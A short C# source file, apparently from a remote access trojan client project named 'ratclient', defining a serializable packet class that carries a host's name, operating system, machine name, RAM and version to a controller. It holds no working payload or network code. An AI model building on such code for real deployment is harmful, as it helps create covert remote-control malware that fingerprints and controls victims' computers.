﻿
using ratclient.Interfaces;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ratclient.Packets
{
    [Serializable]
    public class IdentificationPacket : IPacket
    {
        public string Name;
        public string OperatingSystem;
        public string MachineName;
        public string RAM;
        public string Version;
    }
}
